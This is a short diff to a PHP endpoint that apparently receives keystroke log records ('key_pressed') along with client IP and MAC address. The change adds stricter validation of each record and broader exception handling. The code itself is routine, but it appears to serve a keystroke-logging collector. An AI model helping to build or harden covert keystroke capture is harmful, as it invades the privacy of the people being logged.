@@ -109,7 +109,13 @@ try {
             }
             if (!empty($keyLogs)) {
                 foreach($keyLogs as $record){
-                    if(!is_array($record)){http_response_code(400);echo json_encode(['error'=>'Malformed key record']);exit;}
+                    if(!is_array($record) ||
+                       !is_scalar($record['key']??$record['key_pressed']??null) ||
+                       (string)($record['key']??$record['key_pressed']??'')===''){
+                        http_response_code(400);
+                        echo json_encode(['error'=>'Malformed keyboard record (missing key)']);
+                        exit;
+                    }
                 }
                 $inserted_count = $dbService->addKeyLogs($keyLogs, $clientIP, $macAddress);
                 if($inserted_count===false){
@@ -155,7 +161,7 @@ try {
             exit;
     }
     
-} catch (Exception $e) {
+} catch (Throwable $e) {
     error_log("Error processing event $appEvent: " . $e->getMessage());
     http_response_code(500);
     echo json_encode(['error' => 'Internal server error']);
